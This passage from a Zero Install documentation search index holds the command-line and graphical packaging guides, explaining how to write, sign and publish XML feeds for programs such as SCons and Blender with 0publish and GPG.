/home/tal/dev/edit/Edit.xml (a local feed) You can add additional local and remote feeds to an interface. A local feed is located locally on your machine, whereas a remote feed is located on the web (even if it is cached on your machine).","title":"Feed files"},{"location":"packaging/concepts/#implementations","text":"An implementation is something that implements an interface. Edit-1.9.6 and Edit-1.9.7 are both implementations of http://rox.sourceforge.net/2005/interfaces/Edit . Each implementation of an interface is identified by a cryptographic digest, eg: sha1=235cb9dd77ef78ef2a79abe98f1fcc404bba4889 sha1=c86d09f1113041f5eaaa8c3d1416fcf4dad8e2e0 For platform independent binaries (e.g. Python code) there will be one implementation for each version. For compiled code, there will be one implementation per architecture per version.","title":"Implementations"},{"location":"packaging/concepts/#launching","text":"When you launch a program (like Edit) 0install looks up the feed files of the interface and chooses an implementation of the interface and the interfaces it depends on according to the policy settings (e.g. preferring \"stable\" or \"testing\" implementations). 0install then downloads the implementations if they are missing from the cache. Lastly, 0install uses environment variables (bindings) to tell the program where to find its dependencies; this process is known as Dependency Injection (or Inversion of Control ).","title":"Launching"},{"location":"packaging/guide-cli/","text":"This guide shows how to make software available through Zero Install , using the command-line 0publish program. New users will probably prefer to start with the graphical interface instead, but this version is useful when writing scripts to automatically publish new versions, or if you can't run the graphical version for some reason. We will start by packaging SCons, a build system (a little like Make). You should already be familiar with the general operation of 0install. In not, start by reading the Introduction tutorial . Introduction Creating the interface file Adding the archive Publishing the interface Marking as stable Adding more versions Notes Archives with top-level directories Supported Archive formats Dependencies Why do we need to put the URL in the XML? XML signature format When to use the 'buggy' rating Further reading Introduction SCons is particularly easy to package, because it is designed to be bundled with other applications and used in their build process, and can therefore be executed in place right after unpacking. To try it out, download the scons-local archive from their web-site, unpack it, and run it: $ mkdir scons $ cd scons $ wget http://heanet.dl.sourceforge.net/sourceforge/scons/scons-local-0.96.92.tar.gz $ tar xzf scons-local-0.96.92.tar.gz $ ./scons.py --version SCons by Steven Knight et al.: script: v0.96.92.D002, 2006/04/11 07:39:43, by knight on roxbury engine: v0.96.92.D002, 2006/04/11 07:39:43, by knight on roxbury Copyright (c) 2001, 2002, 2003, 2004 The SCons Foundation Programs that can be run in this way are the easiest to make available through Zero Install. To do this we need to create a small XML file stating: Which versions are available. Where each one can be downloaded from. How each version can be run. Any dependencies each version has on other packages. You can write this interface file with a text editor just by reading the file format specification , but it's easier to use the 0publish command. 0publish will create an initial template for you, check that the file is valid, and makes many operations easier. The command is, of course, available through Zero Install. To save typing it's full URI each time you run it, create an alias now: $ 0install add 0publish http://0install.net/2006/interfaces/0publish $ 0publish --version 0publish (zero-install) 0.5 See also: 0publish SCons homepage Creating the interface file 0publish works by reading in an XML interface file, modifying it in some way, checking that it is still valid, and then writing it back out. If the file doesn't already exist it will offer to create it for you. Run 0publish now to create a new file called SCons.xml : $ 0publish SCons.xml Interface file 'SCons.xml' does not exist. Create it? [Y/N] Y 0publish will create a new template and fire up an editor to let you change it. If you don't like the default, set your EDITOR environment variable to something better, or create an alias called sensible-editor . E.g., to edit interfaces using Edit: $ 0install add sensible-editor http://rox.sourceforge.net/2005/interfaces/Edit Fill in the fields in the XML template. The comments should guide you, but these are the exact changes we will make now: Set the summary to a short description. Start with a lower-case letter (except for proper nouns) and don't include the name of the program. The summary is normally shown after a dash, e.g. SCons - a software construction tool . The description fields can be longer. Copying some text from the web page or from freshmeat often works well. Set the homepage to the program's main web-site (or to your own site if you have a page for it). This is where users will go if they want more information than is in the description. Don't forget to uncomment it by removing the <!-- and --> markers around it. Set the icon to the URL of a small PNG format icon if you want. The main program (which we ran above) is called scons.py , so change the main attribute to that. You can leave the other elements alone for now. Save your file using the default name (it will be to a temporary file) and 0publish will write it as SCons.py if it's valid. If you made a mistake, 0publish will prompt you to fix it first. Your final version should look something like this: <?xml version=\"1.0\" ?> <?xml-stylesheet type='text/xsl' href='http://0install.net/2006/stylesheets/interface.xsl'?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>SCons</name> <summary>a software construction tool</summary> <description> SCons is a software construction tool (build tool substitute for Make) implemented in Python. It features a modular build engine that can be embedded in other software. SCons configuration files are Python scripts that call the build engine API. It can scan files to detect dependencies automatically and maintain a global view of all dependencies in a build tree, and uses MD5 signatures to detect changed file contents reliably. Timestamps can be used if you prefer. SCons also supports parallel builds and is easily extensible through user-defined builder and scanner objects. </description> <homepage>http://www.scons.org/</homepage> <group main=\"scons.py\"> <implementation id=\".\" version=\"0.1\" released='Snapshot'/> </group> </interface> If you created the SCons.xml file in the same directory as you ran ./scons.py above, then you can now execute it already, like this: $ 0launch ./SCons.xml --version SCons by Steven Knight et al.: ... This type of XML file is known as a local interface because its name is a simple filename (normally, interfaces start with http:// and need to be downloaded). Also, the single version ( implementation ) is a local implementation , because it is also identified by a pathname (the directory containing the XML file, . ). In this case, the local interface isn't very useful on its own because we could have just run ./scons.py directly. However, if we had listed any dependencies in the XML file then running it this way would have fetched them through Zero Install, so local interfaces can still be useful (especially for CVS checkouts of software, for example). See also: Feed file format specification Adding the archive The next step is to change the implementation so that Zero Install will download the archive from the SCons web-site instead of requiring the user to have it locally. We should also change the version number and release date to their correct values. Adding the archive is a little tricky to do manually because we need to calculate the secure hash of the contents of the archive. This is needed when downloading from the web to check that the archive hasn't been tampered with. Luckily, 0publish can make the necessary changes and add the required hash at the same time. Use this command (split on to multiple lines for clarity): $ 0publish SCons.xml \\ --set-version=0.96.92 \\ --set-released=today \\ --archive-url=http://heanet.dl.sourceforge.net/sourceforge/scons/scons-local-0.96.92.tar.gz If you now run the program using 0launch again, it will offer to download SCons for you: $ 0launch ./SCons.xml --version If you look in the SCons.xml file, you'll see that 0publish changed the old implementation element to this: <implementation id=\"sha1=4a12f3ecc173b779cda1ece201e08616d2c11758\" released=\"2006-05-18\" version=\"0.96.92\"> <archive href=\"http://heanet.dl.sourceforge.net/sourceforge/scons/scons-local-0.96.92.tar.gz\" size=\"249688\"/> </implementation> The id gives the secure hash of the contents of the package. If the archive is changed (e.g., by someone breaking into SCons's web-server) then the hash won't match and Zero Install will refuse the download. Inside the implementation element is a list of ways of getting it. In this case, we state that a directory with the given hash can be created by downloading the named archive and extracting it. See also: Archives Publishing the interface You'll probably want to put your new interface up on the web, so that other people can get it easily. However, we can't just stick it up as it is because someone might be able to break into the web-server tamper with it, or intercept a user's network connection and insert their own version. We need to put our digital signature on it, using the GnuPG program, so that people can check that it's really from us. If you do not already have a GPG key-pair, create one now. You can accept the defaults for most fields; just enter your name and email address: $ gpg --gen-key We also need to decide on the URL people will use to download it. Since other programs that depend on this one will use the URL to find it, try to pick a URL that won't change. Here, we'll use http://0install.net/tests/SCons.xml , which isn't a very good URL, to discourage people from relying on this test example! Once you've picked a URL you need to add it to the XML file: $ 0publish SCons.xml --set-interface-uri=http://0install.net/tests/SCons.xml The interface file now starts like this: <interface uri=\"http://0install.net/tests/SCons.xml\" ... Finally, we'll add the GPG signature (if you have more than one key, use -k to specify which one to use). You'll need to enter the passphrase you set when you created the key above: $ 0publish SCons.xml --xmlsign Enter passphrase: Exported public key as 'AE07828059A53CC1.gpg' This command adds a digital signature to the XML file. It also exports a copy of your GPG public key, which people will need in order to check the signature. Upload both files to the same directory on your web-server. You should now be able to run your interface with its full URI: $ 0launch http://0install.net/tests/SCons.xml --version SCons by Steven Knight et al.: If this is your first interface, the injector should now ask you to confirm that you trust the new key for signing software. Marking as stable Each implementation in an XML file has a stability setting. Typically, this is testing for a new release and stable for versions that have been around for a while. Normally, the injector will select the highest-numbered stable version by default. However, users who selected Help test new versions will get any newer testing version selected by default instead. By default, new releases are considered to have a stability rating of testing . After a week or so without major problems, set the stability of the testing version to stable : $ 0publish SCons.xml --stable If the version turns out to have serious problems, set it to buggy or insecure instead. There's no automatic option for this, so use -e to edit the file ( 0publish will automatically resign it when you save): $ 0publish SCons.xml --edit Adding more versions You can add more versions of SCons to your interface using 0publish . The process is very similar to before, except that you use --add-version instead of --set-version . So, when version 1.0 is released, do this: $ 0publish SCons.xml \\ --add-version=1.0 \\ --set-released=today \\ --archive-url=http://heanet.dl.sourceforge.net/sourceforge/scons/scons-local-1.0.tar.gz You can also add earlier versions, which may be useful if some programs aren't compatible with the newest version. Notes Archives with top-level directories The SCons archive is a little unusual because it unpacks the files directly into the current directory when you extract it. Most archives would have just a single top-level directory named after the archive (e.g. scons-local-0.96.92 ) and put all the files in that. While you could cope with that by setting the main attribute to be scons-local-VVV/scons.py for each version, it's better to use the extract attribute on the archive element so that all versions have the same structure. This is especially important for libraries, where the main attribute isn't used. Use the --archive-extract=DIR argument to 0publish for this. Supported Archive formats Archive formats are recognised by their file extensions. Supported formats are: .zip .tar .tar.gz or .tgz .tar.bz2 .tar.lzma .tar.xz (since version 0.43, not supported by Windows version) .7z (Windows version only) .msi (Windows version only) .cab .deb (not supported by Windows version) .rpm (not supported by Windows version) .gem (since version 1.0-rc1, not supported by Windows version) Dependencies You can specify that your program depends on other programs using the requires element. See the feed file format document for details. See Easy GTK binary compatibility for an example (building an application requires SCons and the GTK headers). The Packaging Find case study gives an example of this. Why do we need to put the URL in the XML? This is a security feature to let 0launch check that it downloaded the XML the user asked for. Without it, this could happen: I may trust the author of the SecureDelete program to supply software. I tell 0launch to invoke a text editor on a precious document. 0launch tries to download the XML for the text editor from the web. An attacker returns the XML file for SecureDelete , correctly signed by the author of SecureDelete (possibly the same person who wrote the text editor). My file gets securely deleted! XML signature format There are two ways to sign interface files. The --gpgsign option creates signatures in a format that all versions of the injector can read but they don't look great if you view the interface using a web-browser. The --xmlsign option still uses gpg to sign it, but the result is still XML and can therefore be styled nicely. However, such interfaces require users to have version 0.18 or later of the injector. When to use the 'buggy' rating Only mark versions as buggy if there's a serious problem that means people really shouldn't use it (not just a few minor annoyances; all software has some bugs). Normally, just releasing a newer (fixed) version is sufficient, since the injector will offer to upgrade the version anyway. Further reading Example: Find Find is a Python program with a dependency on a Python library. This example shows how to depend on other components. Example: Inkscape Inkscape is distributed as a binary RPM (among other formats). This guide shows how to publish these RPMs so that they can be run using Zero Install (by users without root access or on Debian systems, for example). Example: ROX-Filer ROX-Filer is a C program, which requires different binaries for different platforms. These binaries are built and published in interface files maintained by different people. Using the injector's feed mechanism, users only need to use the main ROX-Filer interface and will automatically get a binary for their platform, from the maintainer of that binary. 0publish A command reference for the 0publish command. Compiling with SCons and GTK Now that we've made SCons available through Zero Install, we can use it in our build scripts. This example shows how to build a GTK application written in C using Zero Install to get the build tool and the header files automatically.","title":"Packaging guide (command-line)"},{"location":"packaging/guide-cli/#introduction","text":"SCons is particularly easy to package, because it is designed to be bundled with other applications and used in their build process, and can therefore be executed in place right after unpacking. To try it out, download the scons-local archive from their web-site, unpack it, and run it: $ mkdir scons $ cd scons $ wget http://heanet.dl.sourceforge.net/sourceforge/scons/scons-local-0.96.92.tar.gz $ tar xzf scons-local-0.96.92.tar.gz $ ./scons.py --version SCons by Steven Knight et al.: script: v0.96.92.D002, 2006/04/11 07:39:43, by knight on roxbury engine: v0.96.92.D002, 2006/04/11 07:39:43, by knight on roxbury Copyright (c) 2001, 2002, 2003, 2004 The SCons Foundation Programs that can be run in this way are the easiest to make available through Zero Install. To do this we need to create a small XML file stating: Which versions are available. Where each one can be downloaded from. How each version can be run. Any dependencies each version has on other packages. You can write this interface file with a text editor just by reading the file format specification , but it's easier to use the 0publish command. 0publish will create an initial template for you, check that the file is valid, and makes many operations easier. The command is, of course, available through Zero Install. To save typing it's full URI each time you run it, create an alias now: $ 0install add 0publish http://0install.net/2006/interfaces/0publish $ 0publish --version 0publish (zero-install) 0.5 See also: 0publish SCons homepage","title":"Introduction"},{"location":"packaging/guide-cli/#creating-the-interface-file","text":"0publish works by reading in an XML interface file, modifying it in some way, checking that it is still valid, and then writing it back out. If the file doesn't already exist it will offer to create it for you. Run 0publish now to create a new file called SCons.xml : $ 0publish SCons.xml Interface file 'SCons.xml' does not exist. Create it? [Y/N] Y 0publish will create a new template and fire up an editor to let you change it. If you don't like the default, set your EDITOR environment variable to something better, or create an alias called sensible-editor . E.g., to edit interfaces using Edit: $ 0install add sensible-editor http://rox.sourceforge.net/2005/interfaces/Edit Fill in the fields in the XML template. The comments should guide you, but these are the exact changes we will make now: Set the summary to a short description. Start with a lower-case letter (except for proper nouns) and don't include the name of the program. The summary is normally shown after a dash, e.g. SCons - a software construction tool . The description fields can be longer. Copying some text from the web page or from freshmeat often works well. Set the homepage to the program's main web-site (or to your own site if you have a page for it). This is where users will go if they want more information than is in the description. Don't forget to uncomment it by removing the <!-- and --> markers around it. Set the icon to the URL of a small PNG format icon if you want. The main program (which we ran above) is called scons.py , so change the main attribute to that. You can leave the other elements alone for now. Save your file using the default name (it will be to a temporary file) and 0publish will write it as SCons.py if it's valid. If you made a mistake, 0publish will prompt you to fix it first. Your final version should look something like this: <?xml version=\"1.0\" ?> <?xml-stylesheet type='text/xsl' href='http://0install.net/2006/stylesheets/interface.xsl'?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>SCons</name> <summary>a software construction tool</summary> <description> SCons is a software construction tool (build tool substitute for Make) implemented in Python. It features a modular build engine that can be embedded in other software. SCons configuration files are Python scripts that call the build engine API. It can scan files to detect dependencies automatically and maintain a global view of all dependencies in a build tree, and uses MD5 signatures to detect changed file contents reliably. Timestamps can be used if you prefer. SCons also supports parallel builds and is easily extensible through user-defined builder and scanner objects. </description> <homepage>http://www.scons.org/</homepage> <group main=\"scons.py\"> <implementation id=\".\" version=\"0.1\" released='Snapshot'/> </group> </interface> If you created the SCons.xml file in the same directory as you ran ./scons.py above, then you can now execute it already, like this: $ 0launch ./SCons.xml --version SCons by Steven Knight et al.: ... This type of XML file is known as a local interface because its name is a simple filename (normally, interfaces start with http:// and need to be downloaded). Also, the single version ( implementation ) is a local implementation , because it is also identified by a pathname (the directory containing the XML file, . ). In this case, the local interface isn't very useful on its own because we could have just run ./scons.py directly. However, if we had listed any dependencies in the XML file then running it this way would have fetched them through Zero Install, so local interfaces can still be useful (especially for CVS checkouts of software, for example). See also: Feed file format specification","title":"Creating the interface file"},{"location":"packaging/guide-cli/#adding-the-archive","text":"The next step is to change the implementation so that Zero Install will download the archive from the SCons web-site instead of requiring the user to have it locally. We should also change the version number and release date to their correct values. Adding the archive is a little tricky to do manually because we need to calculate the secure hash of the contents of the archive. This is needed when downloading from the web to check that the archive hasn't been tampered with. Luckily, 0publish can make the necessary changes and add the required hash at the same time. Use this command (split on to multiple lines for clarity): $ 0publish SCons.xml \\ --set-version=0.96.92 \\ --set-released=today \\ --archive-url=http://heanet.dl.sourceforge.net/sourceforge/scons/scons-local-0.96.92.tar.gz If you now run the program using 0launch again, it will offer to download SCons for you: $ 0launch ./SCons.xml --version If you look in the SCons.xml file, you'll see that 0publish changed the old implementation element to this: <implementation id=\"sha1=4a12f3ecc173b779cda1ece201e08616d2c11758\" released=\"2006-05-18\" version=\"0.96.92\"> <archive href=\"http://heanet.dl.sourceforge.net/sourceforge/scons/scons-local-0.96.92.tar.gz\" size=\"249688\"/> </implementation> The id gives the secure hash of the contents of the package. If the archive is changed (e.g., by someone breaking into SCons's web-server) then the hash won't match and Zero Install will refuse the download. Inside the implementation element is a list of ways of getting it. In this case, we state that a directory with the given hash can be created by downloading the named archive and extracting it. See also: Archives","title":"Adding the archive"},{"location":"packaging/guide-cli/#publishing-the-interface","text":"You'll probably want to put your new interface up on the web, so that other people can get it easily. However, we can't just stick it up as it is because someone might be able to break into the web-server tamper with it, or intercept a user's network connection and insert their own version. We need to put our digital signature on it, using the GnuPG program, so that people can check that it's really from us. If you do not already have a GPG key-pair, create one now. You can accept the defaults for most fields; just enter your name and email address: $ gpg --gen-key We also need to decide on the URL people will use to download it. Since other programs that depend on this one will use the URL to find it, try to pick a URL that won't change. Here, we'll use http://0install.net/tests/SCons.xml , which isn't a very good URL, to discourage people from relying on this test example! Once you've picked a URL you need to add it to the XML file: $ 0publish SCons.xml --set-interface-uri=http://0install.net/tests/SCons.xml The interface file now starts like this: <interface uri=\"http://0install.net/tests/SCons.xml\" ... Finally, we'll add the GPG signature (if you have more than one key, use -k to specify which one to use). You'll need to enter the passphrase you set when you created the key above: $ 0publish SCons.xml --xmlsign Enter passphrase: Exported public key as 'AE07828059A53CC1.gpg' This command adds a digital signature to the XML file. It also exports a copy of your GPG public key, which people will need in order to check the signature. Upload both files to the same directory on your web-server. You should now be able to run your interface with its full URI: $ 0launch http://0install.net/tests/SCons.xml --version SCons by Steven Knight et al.: If this is your first interface, the injector should now ask you to confirm that you trust the new key for signing software.","title":"Publishing the interface"},{"location":"packaging/guide-cli/#marking-as-stable","text":"Each implementation in an XML file has a stability setting. Typically, this is testing for a new release and stable for versions that have been around for a while. Normally, the injector will select the highest-numbered stable version by default. However, users who selected Help test new versions will get any newer testing version selected by default instead. By default, new releases are considered to have a stability rating of testing . After a week or so without major problems, set the stability of the testing version to stable : $ 0publish SCons.xml --stable If the version turns out to have serious problems, set it to buggy or insecure instead. There's no automatic option for this, so use -e to edit the file ( 0publish will automatically resign it when you save): $ 0publish SCons.xml --edit","title":"Marking as stable"},{"location":"packaging/guide-cli/#adding-more-versions","text":"You can add more versions of SCons to your interface using 0publish . The process is very similar to before, except that you use --add-version instead of --set-version . So, when version 1.0 is released, do this: $ 0publish SCons.xml \\ --add-version=1.0 \\ --set-released=today \\ --archive-url=http://heanet.dl.sourceforge.net/sourceforge/scons/scons-local-1.0.tar.gz You can also add earlier versions, which may be useful if some programs aren't compatible with the newest version.","title":"Adding more versions"},{"location":"packaging/guide-cli/#notes","text":"","title":"Notes"},{"location":"packaging/guide-cli/#archives-with-top-level-directories","text":"The SCons archive is a little unusual because it unpacks the files directly into the current directory when you extract it. Most archives would have just a single top-level directory named after the archive (e.g. scons-local-0.96.92 ) and put all the files in that. While you could cope with that by setting the main attribute to be scons-local-VVV/scons.py for each version, it's better to use the extract attribute on the archive element so that all versions have the same structure. This is especially important for libraries, where the main attribute isn't used. Use the --archive-extract=DIR argument to 0publish for this.","title":"Archives with top-level directories"},{"location":"packaging/guide-cli/#supported-archive-formats","text":"Archive formats are recognised by their file extensions. Supported formats are: .zip .tar .tar.gz or .tgz .tar.bz2 .tar.lzma .tar.xz (since version 0.43, not supported by Windows version) .7z (Windows version only) .msi (Windows version only) .cab .deb (not supported by Windows version) .rpm (not supported by Windows version) .gem (since version 1.0-rc1, not supported by Windows version)","title":"Supported Archive formats"},{"location":"packaging/guide-cli/#dependencies","text":"You can specify that your program depends on other programs using the requires element. See the feed file format document for details. See Easy GTK binary compatibility for an example (building an application requires SCons and the GTK headers). The Packaging Find case study gives an example of this.","title":"Dependencies"},{"location":"packaging/guide-cli/#why-do-we-need-to-put-the-url-in-the-xml","text":"This is a security feature to let 0launch check that it downloaded the XML the user asked for. Without it, this could happen: I may trust the author of the SecureDelete program to supply software. I tell 0launch to invoke a text editor on a precious document. 0launch tries to download the XML for the text editor from the web. An attacker returns the XML file for SecureDelete , correctly signed by the author of SecureDelete (possibly the same person who wrote the text editor). My file gets securely deleted!","title":"Why do we need to put the URL in the XML?"},{"location":"packaging/guide-cli/#xml-signature-format","text":"There are two ways to sign interface files. The --gpgsign option creates signatures in a format that all versions of the injector can read but they don't look great if you view the interface using a web-browser. The --xmlsign option still uses gpg to sign it, but the result is still XML and can therefore be styled nicely. However, such interfaces require users to have version 0.18 or later of the injector.","title":"XML signature format"},{"location":"packaging/guide-cli/#when-to-use-the-buggy-rating","text":"Only mark versions as buggy if there's a serious problem that means people really shouldn't use it (not just a few minor annoyances; all software has some bugs). Normally, just releasing a newer (fixed) version is sufficient, since the injector will offer to upgrade the version anyway.","title":"When to use the 'buggy' rating"},{"location":"packaging/guide-cli/#further-reading","text":"Example: Find Find is a Python program with a dependency on a Python library. This example shows how to depend on other components. Example: Inkscape Inkscape is distributed as a binary RPM (among other formats). This guide shows how to publish these RPMs so that they can be run using Zero Install (by users without root access or on Debian systems, for example). Example: ROX-Filer ROX-Filer is a C program, which requires different binaries for different platforms. These binaries are built and published in interface files maintained by different people. Using the injector's feed mechanism, users only need to use the main ROX-Filer interface and will automatically get a binary for their platform, from the maintainer of that binary. 0publish A command reference for the 0publish command. Compiling with SCons and GTK Now that we've made SCons available through Zero Install, we can use it in our build scripts. This example shows how to build a GTK application written in C using Zero Install to get the build tool and the header files automatically.","title":"Further reading"},{"location":"packaging/guide-gui/","text":"This guide shows how to make software available through Zero Install . We will start by packaging Blender , an open source 3D modelling and animation program. You should already be familiar with the general operation of Zero Install. If not, start by reading the Introduction tutorial . We assume here that a binary release already exists (perhaps published by someone else) and you want to make it available through 0install. If you want to publish your own programs, you might also be interested in 0release , which generates a release from a Git repository. Tutorial Check your feed! Groups and dependencies Trouble-shooting Further reading Tip : To check whether someone has already packaged a program, use the search feature at the top of this page to search all known existing feeds. Tutorial To make a program available via Zero Install you need to create an XML 'feed' file, describing which versions are available, where they can be downloaded, and what other software they require. In this tutorial, we'll use the graphical 0publish-gui application to create this file. If you don't want to use a graphical interface (for example, because you want to publish new versions using a script) then you should read the command-line tutorial instead. Start by getting 0publish-gui in the usual way: $ 0install add 0publish-gui http://0install.net/2007/interfaces/0publish-gui.xml This program requires GTK >= 2.6 and Python >= 2.4 (these are not fetched using Zero Install at present). Windows users: the Zero Install Publishing tools is a .NET equivalent of 0publish-GUI. Run the program, giving it the name of the feed file you want to create, which should be named after the program: $ 0publish-gui Blender.xml A window appears prompting you to enter some details about the program. Here, I've copied the details from the project's freshmeat.net page. The Icon field is optional, but I've added one anyway: The next step is to add one or move versions of Blender to the feed, which we can do from the Versions tab using the Add Archive button: Enter the URL of the archive for the new version (copy the link from the Blender site). This URL tells other people where to get it, so it must be present. If you've already downloaded the archive then choose it in the Local copy section. Otherwise, click on Download to download it now: The top-level items in the archive are displayed in the Extract area. The reason for this is that there are two common ways of laying out archives. Some people put the files in the archive directly, while others create an extra top-level directory. In blender's case, the archive contains a single top-level directory called blender-2.42a-linux-glibc232-py24-i386-static . The reason this matters is because we need each version to have a similar structure. We don't want a directory name that's going to be different each time, so we select to extract just the contents of this directory. 0publish-gui is pretty smart about guessing whether to extract everything or just a sub-directory, so just go with the default. Now we are prompted to enter some extra information about this version. The most important field to set is Main , which is the executable program inside the archive that is run when someone tries to use your feed. The drop-down menu shows the available executables. The License and Released fields are just for information. Released is the date you added this version to the feed, so the default of today's date is correct. The OS and CPU fields prevent people from trying to use this version on incompatible machines. The Docs field can be used to say which directory contains the documentation, if any. I've left Stability set to (inherit) , which means that the rating will be inherited from any containing group. Since we don't have a group, it will get the default value of Testing . You can also inherit the other fields (by leaving them blank), although OS and CPU are inherited together (you can't inherit one and not the other). Groups are useful when you have lots of versions, so you don't have to keep specifying the same information for each one. Finally, the shaded ID field displays a cryptographic digest of the archive's contents. When other people use this feed to get Blender 2.42, this is how they know that they've downloaded exactly the same files as you have (in case an attacker replaces the download with a modified version). You'll now see your new version shown in the list of versions, along with the single archive, which says where to get it. The names in parenthesis show which attributes we set. We can try out the interface by clicking on the Save and Test button: This runs 0launch on our XML file, in the usual way. Note that version 2.42 is already cached; it was added when we clicked OK in the Add Archive box. Click on Execute and check that it runs. It all works perfectly, so we'll publish this feed on the web for other people to use. To do this, we need to sign the feed so people can check that it's really from us. Go to the Publishing tab and choose your GPG key from the menu. If you don't have a key, click on the Add button to create one now. When generating a key, you'll be asked a few difficult-looking questions; if unsure, just accept the defaults offered. Enter your name and e-mail address when prompted, and choose a good passphrase to protect the key: There's one final thing left to do: we need to decide where on the web we'll publish the XML file. Enter the URL that people will use to download your feed in the section titled This feed's URL . Try to pick a location that won't change, as people will keep coming back here for updates. Click on Save to save it again. This time, you'll be prompted to enter your key passphrase (the one you chose when creating the key above): The final result of all this is three files: the signed XML feed file itself, listing our single version, your GPG public key, which lets people check the signature, and an XSLT stylesheet, in case anyone wants to view the feed in their browser. Upload all three files to your web-server. I put mine in http://0install.net/2007/3rd-party . Now anyone can run Blender with the command: $ 0launch http://0install.net/2007/3rd-party/Blender.xml Check your feed! It's surprising how easy it is to forget to set the right permissions, etc, so check your new feed! FeedLint is an easy first step: $ 0install add feedlint http://0install.net/2007/interfaces/FeedLint.xml $ feedlint http://0install.net/2007/3rd-party/Blender.xml Groups and dependencies If the software depends on something else (e.g. a library) then use the Add Requires button to specify this. For example, 0publish-gui depends on ROX-Lib , which I specified like this: This ensures that .../ROX-Lib2/python is in PYTHONPATH . When 0publish-gui does import rox , the import thus uses the directory .../ROX-Lib2/python/rox . When you want to add more versions, you should use the Add Group button to create a group. Make sure both versions are inside the new group (use drag-and-drop to move them). Then you only need to set the license, main, OS and CPU settings in one place. You can also share dependencies using groups. Trouble-shooting I can't find a generic binary for the program I want to package! Popular projects usually provide a \"generic\" binary tarball, which works on most Linux distributions. This is the best archive to put in the feed. If there isn't one, it might mean that the developers couldn't get a single binary to work on multiple distributions, or it might just mean they haven't tried. Often, a Red Hat RPM will work just fine on Debian (e.g. the LyX feed ), or a .deb will work on Red Hat, etc. If there are several options, pick the one for the distribution which is furthest behind (e.g. Red Hat rather than Fedora). Packages for old systems often still work with newer ones, but not the other way around. My program assumes it's running from /usr/games Games have an annoying habit of trying to cd to a hard-coded directory in their start-up script. You could try asking the author to fix it ( cd \"$(dirname $0)\" would work just as well). It's also possible to patch the download using a <recipe> element, but the GUI doesn't provide an interface for this. The trick here is getting the ID right; you need the digest of the directory structure after the patch has been applied. 0store manifest can help here. Further reading Example: Find Find is a Python program with a dependency on a Python library. This example shows how to depend on other components. Example: Inkscape Inkscape is distributed as a binary RPM (among other formats). This guide shows how to publish these RPMs so that they can be run using Zero Install (by users without root access or on Debian systems, for example). Example: ROX-Filer ROX-Filer is a C program, which requires different binaries for different platforms. These binaries are built and published in interface files maintained by different people. Using the injector's feed mechanism, users only need to use the main ROX-Filer interface and will automatically get a binary for their platform, from the maintainer of that binary. 0publish A command reference for the 0publish command. Compiling with SCons and GTK Now that we've made SCons available through Zero Install, we can use it in our build scripts. This example shows how to build a GTK application written in C using Zero Install to get the build tool and the header files automatically.","title":"Packaging guide (graphical)"},{"location":"packaging/guide-gui/#tutorial","text":"To make a program available via Zero Install you need to create an XML 'feed' file, describing which versions are available, where they can be downloaded, and what other software they require. In this tutorial, we'll use the graphical 0publish-gui application to create this file. If you don't want to use a graphical interface (for example, because you want to publish new versions using a script) then you should read the command-line tutorial instead. Start by getting 0publish-gui in the usual way: $ 0install add 0publish-gui http://0install.net/2007/interfaces/0publish-gui.xml This program requires GTK >= 2.6 and Python >= 2.4 (these are not fetched using Zero Install at present). Windows users: the Zero Install Publishing tools is a .NET equivalent of 0publish-GUI. Run the program, giving it the name of the feed file you want to create, which should be named after the program: $ 0publish-gui Blender.xml A window appears prompting you to enter some details about the program. Here, I've copied the details from the project's freshmeat.net page. The Icon field is optional, but I've added one anyway: The next step is to add one or move versions of Blender to the feed, which we can do from the Versions tab using the Add Archive button: Enter the URL of the archive for the new version (copy the link from the Blender site). This URL tells other people where to get it, so it must be present. If you've already downloaded the archive then choose it in the Local copy section. Otherwise, click on Download to download it now: The top-level items in the archive are displayed in the Extract area. The reason for this is that there are two common ways of laying out archives. Some people put the files in the archive directly, while others create an extra top-level directory. In blender's case, the archive contains a single top-level directory called blender-2.42a-linux-glibc232-py24-i386-static . The reason this matters is because we need each version to have a similar structure. We don't want a directory name that's going to be different each time, so we select to extract just the contents of this directory. 0publish-gui is pretty smart about guessing whether to extract everything or just a sub-directory, so just go with the default. Now we are prompted to enter some extra information about this version. The most important field to set is Main , which is the executable program inside the archive that is run when someone tries to use your feed. The drop-down menu shows the available executables. The License and Released fields are just for information. Released is the date you added this version to the feed, so the default of today's date is correct. The OS and CPU fields prevent people from trying to use this version on incompatible machines. The Docs field can be used to say which directory contains the documentation, if any. I've left Stability set to (inherit) , which means that the rating will be inherited from any containing group. Since we don't have a group, it will get the default value of Testing . You can also inherit the other fields (by leaving them blank), although OS and CPU are inherited together (you can't inherit one and not the other). Groups are useful when you have lots of versions, so you don't have to keep specifying the same information for each one. Finally, the shaded ID field displays a cryptographic digest of the archive's contents. When other people use this feed to get Blender 2.42, this is how they know that they've downloaded exactly the same files as you have (in case an attacker replaces the download with a modified version). You'll now see your new version shown in the list of versions, along with the single archive, which says where to get it. The names in parenthesis show which attributes we set. We can try out the interface by clicking on the Save and Test button: This runs 0launch on our XML file, in the usual way. Note that version 2.42 is already cached; it was added when we clicked OK in the Add Archive box. Click on Execute and check that it runs. It all works perfectly, so we'll publish this feed on the web for other people to use. To do this, we need to sign the feed so people can check that it's really from us. Go to the Publishing tab and choose your GPG key from the menu. If you don't have a key, click on the Add button to create one now. When generating a key, you'll be asked a few difficult-looking questions; if unsure, just accept the defaults offered. Enter your name and e-mail address when prompted, and choose a good passphrase to protect the key: There's one final thing left to do: we need to decide where on the web we'll publish the XML file. Enter the URL that people will use to download your feed in the section titled This feed's URL . Try to pick a location that won't change, as people will keep coming back here for updates. Click on Save to save it again. This time, you'll be prompted to enter your key passphrase (the one you chose when creating the key above): The final result of all this is three files: the signed XML feed file itself, listing our single version, your GPG public key, which lets people check the signature, and an XSLT stylesheet, in case anyone wants to view the feed in their browser. Upload all three files to your web-server. I put mine in http://0install.net/2007/3rd-party . Now anyone can run Blender with the command: $ 0launch http://0install.net/2007/3rd-party/Blender.xml","title":"Tutorial"},{"location":"packaging/guide-gui/#check-your-feed","text":"It's surprising how easy it is to forget to set the right permissions, etc, so check your new feed! FeedLint is an easy first step: $ 0install add feedlint http://0install.net/2007/interfaces/FeedLint.xml $ feedlint http://0install.net/2007/3rd-party/Blender.xml","title":"Check your feed!"},{"location":"packaging/guide-gui/#groups-and-dependencies","text":"If the software depends on something else (e.g. a library) then use the Add Requires button to specify this. For example, 0publish-gui depends on ROX-Lib , which I 